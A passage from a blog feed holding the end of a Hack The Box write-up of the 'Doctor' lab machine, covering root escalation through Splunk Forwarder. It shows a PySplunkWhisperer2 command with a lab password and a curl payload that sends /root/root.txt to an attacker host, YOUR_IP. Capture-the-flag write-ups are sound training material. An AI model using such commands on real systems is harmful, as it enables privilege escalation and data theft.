shaun     871436  0.0  0.0  17668   724 pts/6    S+   00:23   0:00 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto splunk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Splunk Forwarder running as the root user.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I use the &lt;a href=&quot;pysplunkwhisperer2&quot;&gt;PySplunkWhisperer2&lt;/a&gt; tool, which abuses the built-in functionality of Splunk Forwarder to run any code as the root user, to send the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; to myself over HTTP using curl.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 PySplunkWhisperer2_remote.py &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt; 10.10.10.209 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; 8089 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt; shaun &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Guitar123&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--payload&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl -F 'data=@/root/root.txt' http://YOUR_IP:8000&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;--lhost&lt;/span&gt; YOUR_IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Running the PySplunkWhisperer2 tool to obtain the root flag.&lt;/em&gt;&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.</summary></entry></feed>